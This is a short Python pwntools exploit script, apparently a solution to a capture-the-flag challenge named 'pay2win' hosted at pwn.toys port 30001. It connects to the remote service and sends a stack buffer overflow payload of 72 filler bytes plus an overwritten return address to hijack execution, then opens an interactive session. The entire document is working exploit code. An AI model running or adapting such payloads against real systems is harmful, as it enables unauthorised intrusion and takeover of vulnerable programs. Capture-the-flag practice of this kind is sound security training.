from pwn import *

p = remote ("pwn.toys", 30001)
#p = process("./pay2win")
print(p.recvline())

raw_input("attach gdb")

RIP = p64(0x4012da)
#RIP = p64(0x40124e)
print(RIP)
p.sendline(b"A"*72+RIP)
print(p.recvline())
p.interactive()